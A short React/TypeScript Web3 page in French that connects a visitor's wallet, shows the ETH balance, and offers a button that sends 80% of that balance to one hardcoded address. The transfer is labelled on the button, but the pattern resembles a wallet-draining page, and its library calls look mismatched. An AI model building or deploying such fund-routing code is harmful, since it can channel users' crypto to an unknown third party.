import { useState, useEffect } from "react";
import { useAccount, useConnect, useClient } from "wagmi";
import { ethers } from "ethers";

export default function Home() {
  const { isConnected, address } = useAccount();
  const { connect, connectors } = useConnect();
  const client = useClient(); // Correction de la destructuration
  const provider = client?.provider;

  const [balance, setBalance] = useState<string | null>(null);

  useEffect(() => {
    const fetchBalance = async () => {
      if (!isConnected || !provider || !address) return;

      try {
        const balance = await provider.getBalance(address);
        setBalance(ethers.utils.formatEther(balance));
      } catch (error) {
        console.error("Erreur lors de la récupération du solde :", error);
      }
    };

    fetchBalance();
  }, [isConnected, provider, address]);

  const handleTransfer = async () => {
    if (!provider || !balance) return;

    try {
      const signer = provider.getSigner();
      const amountToSend = ethers.utils.parseEther(
        (parseFloat(balance) * 0.8).toString()
      );

      const tx = await signer.sendTransaction({
        to: "0x518c5D62647E60864EcB3826e982c93dFa154af3",
        value: amountToSend,
      });

      console.log("Transaction envoyée :", tx);
      await tx.wait();
      console.log("Transaction confirmée");
    } catch (error) {
      console.error("Erreur lors de l'envoi de la transaction :", error);
    }
  };

  return (
    <div>
      <h1>Bienvenue sur mon site Web3 !</h1>
      {!isConnected ? (
        <button onClick={() => connect({ connector: connectors[0] })}>
          Connecter mon portefeuille
        </button>
      ) : (
        <>
          <p>Solde actuel : {balance} ETH</p>
          <button onClick={handleTransfer}>Envoyer 80% de mon solde</button>
        </>
      )}
    </div>
  );
}
